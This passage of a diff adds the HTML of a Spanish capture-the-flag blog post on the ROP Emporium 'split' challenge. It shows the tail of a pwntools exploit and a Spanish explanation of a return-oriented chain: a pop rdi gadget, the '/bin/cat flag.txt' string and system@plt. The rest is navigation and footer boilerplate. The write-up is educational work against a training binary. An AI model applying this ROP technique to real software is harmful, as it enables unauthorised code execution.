+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvall</span><span class="p">().</span><span class="nf">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>Y lo que hicimos fue:</p>
+
+<ul>
+  <li>Cambiar el return adress a la dirección de pop rdi; ret.</li>
+  <li>Después del return adress, pusimos la dirección de /bin/cat flag.txt</li>
+  <li>Después de la dirección de /bin/cat flag.txt, pusimos la dirección de system@plt</li>
+</ul>
+
+<p>De esta manera después de la última instrucción de <code class="language-plaintext highlighter-rouge">pwnme</code> se ejecute (osea el <code class="language-plaintext highlighter-rouge">ret</code>), el <code class="language-plaintext highlighter-rouge">RIP</code> saltara a la dirección de <code class="language-plaintext highlighter-rouge">pop rdi;ret</code>, simultáneamente el <code class="language-plaintext highlighter-rouge">RSP</code> apuntará ahora a la dirección de <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code>. Luego se pondrá en <code class="language-plaintext highlighter-rouge">rdi</code> la dirección de <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code> y el <code class="language-plaintext highlighter-rouge">ret</code> ejecutará la funcion<code class="language-plaintext highlighter-rouge">system</code> que tiene como argumento <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code> <img class="emoji" title=":point_up:" alt=":point_up:" src="https://github.githubassets.com/images/icons/emoji/unicode/261d.png" height="20" width="20"> 🤓</p>
+
+<p>Y al ejecutarlo nos da la flag:</p>
+
+<p><img src="/assets/img/spilt/exploit.png" alt=""></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+<p><img src="/assets/img/spilt/waifu.gif" alt=""></p>
+
+
+    </div>
+    
+    
+</article>
+<div class="post-nav">
+<a class="previous" href="/explotacion%20binaria/2023/01/09/srop.html" title="Programación Orientada a Sigreturn (SROP)">Programación Orientada a Sigreturn (SROP)</a><a class="next" href="/hackthebox/2023/01/16/htb-shoppy.html" title="HackTheBox Shoppy - NoSQL injection y Docker">HackTheBox Shoppy - NoSQL injection y...</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/hackthebox/2023/04/11/htb-busqueda.html" title="HackTheBox Shoppy - NoSQL injection y Docker">HackTheBox Busqueda - Arbitrary Code Execution via eval()</a></li>
+<li><a class="post-link" href="/explotacion%20binaria/2023/01/24/picoCTF-here's-a-libc.html" title="HackTheBox Shoppy - NoSQL injection y Docker">picoCTF Here's a libc - ret2libc y bypass ASLR</a></li>
+<li><a class="post-link" href="/maldev/2023/06/16/maldev-bypassAV-fiberInjection.html" title="HackTheBox Shoppy - NoSQL injection y Docker">Inyeccion de shellcode via Fiber injection + Timming attack (SetTimer)</a></li>
+<li><a class="post-link" href="/maldev/2023/06/07/maldev-shellcodes.html" title="HackTheBox Shoppy - NoSQL injection y Docker">Shellcodes - syscall write() y execve(bin/sh)</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+  
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+  
+  
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --></section>
+</div>
+
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div align="center" class="wrapper">
+    <div class="site-footer-inner">
+<div class="footer-col rss-subscribe">
+	  <font size="1" color="gray">
+	  <!--RSS SVG-->
+   	<svg aria-hidden="true" fill="#ff4e00" height="12" width="12" viewbox="0 0 16 16" version="1.1" data-view-component="true" class="octicon octicon-rss mr-1">
+    <path fill-rule="evenodd" d="M2.002 2.725a.75.75 0 01.797-.699C8.79 2.42 13.58 7.21 13.974 13.201a.75.75 0 11-1.497.098 10.502 10.502 0 00-9.776-9.776.75.75 0 01-.7-.798zM2 13a1 1 0 112 0 1 1 0 01-2 0zm.84-5.95a.75.75 0 00-.179 1.489c2.509.3 4.5 2.291 4.8 4.8a.75.75 0 101.49-.178A7.003 7.003 0 002.838 7.05z"></path>
+    </svg>
+	  <a href="/feed.xml" target="_blank"> RSS </a>订阅 |  
+    <!--提供支持-->
+    由 <a title="Jekyll is a simple, blog-aware, static site
+    generator." href="http://jekyllrb.com/" target="_blank">Jekyll</a> &amp; <a title="Yat, yet
+    another theme." href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">Yat Theme</a>提供支持
+	  </font>
+</div>
+
+    <!--版权-->
+    <div>
+    <font size="1" color="gray">
+    Copyright © 2017-2023 <a href="https://github.com/ic4rta/">c4rta</a> All Rights Reserved
+    </font>
+</div>
+
+      <!--logo
+  <div>
+
+    <a href="https://github.com/vanhiupun" target="_blank">
+      <img src="https://visitor-badge.glitch.me/badge?page_id=vanhiupun.visitor-badge&right_color=Orange" alt="visitor" />
+    </a> 
+	    
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml" target="_blank">
+        <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/jekyll.yml/badge.svg" />
+    </a>
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml" target="_blank">
+      <img src="https://github.com/vanhiupun/Vanhiupun.github.io/actions/workflows/codeql-analysis.yml/badge.svg">
+    </a> 
+      
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io" target="_blank">
+      <img src="https://www.codefactor.io/repository/github/vanhiupun/vanhiupun.github.io/badge" alt="CodeFactor" />
+    </a>
+    
+    <a href="https://codeclimate.com/github/vanhiupun/Vanhiupun.github.io/maintainability">
+      <img src="https://api.codeclimate.com/v1/badges/708da11ffb90a8f6f13b/maintainability" alt="maintainability" />
+    </a>
+    
+    <a href="https://rubygems.org/gems/jekyll-theme-yat" target="_blank">
+        <img src="https://badge.fury.io/rb/jekyll-theme-yat.svg"     alt="jekyll-theme-yat" />
+    </a> 
+    
+    <a href="https://github.com/vanhiupun" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Repository-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Github" />
+    </a> 
+          
+    <a href="https://vanhiupun.github.io" target="_blank">
+        <img src="https://img.shields.io/badge/Github%20Page-222222?style=flat-square&logo=github&logoColor=ffffff" alt="Blog" />
+    </a> 
+          
+    <a href="mailto:fanxiaobin422@gmail.com" target="_blank">
+        <img src="https://img.shields.io/badge/Send%20me%20Gmail-EA4335?style=flat-square&logo=Gmail&logoColor=ffffff" alt="Gmail" />
+    </a> 
+          
+    <a href="https://github.com/vanhiupun/Vanhiupun.github.io/blob/c0c037532393ee2718892f87b200a0bbe33e7eb9/License" target="_blank">
+        <img src="https://img.shields.io/badge/License%20MIT-f2cb05?style=flat-square&logo=Mitsubishi&logoColor=222222" alt="MIT" />
+    </a>
+          
+    <a href="http://jekyllthemes.org/" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%20Themes-f2cb05?style=flat-square&logo=Jekyll&logoColor=222222" alt="jekyll-themes" />
+    </a> 
+    
+    <a href="https://github.com/jeffreytse/jekyll-theme-yat" target="_blank">
+        <img src="https://img.shields.io/badge/Jekyll%C2%B7Theme%C2%B7Yat-f2cb05?style=flat-square&logo=github&logoColor=181717" alt="Jekyll-yat" />
+    </a> 
+      
+    <a href="https://raw.githubusercontent.com/vanhiupun/Vanhiupun.github.io/master/assets/images/img/zz.png" target="_blank">
+        <img src="https://img.shields.io/badge/GitHub%20Sponsors-EA4335?style=flat-square&logo=GitHub%20Sponsors&logoColor=222222" alt="/GitHub%20Sponsors" />
+    </a> 
+  </div>-->
+  </div>
+  </div>
+</footer>
+</body>
+</html><html>
+<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  backgroundColor: '#ff5100',
+  textColor: '#fff'
+})</script>
+</html>
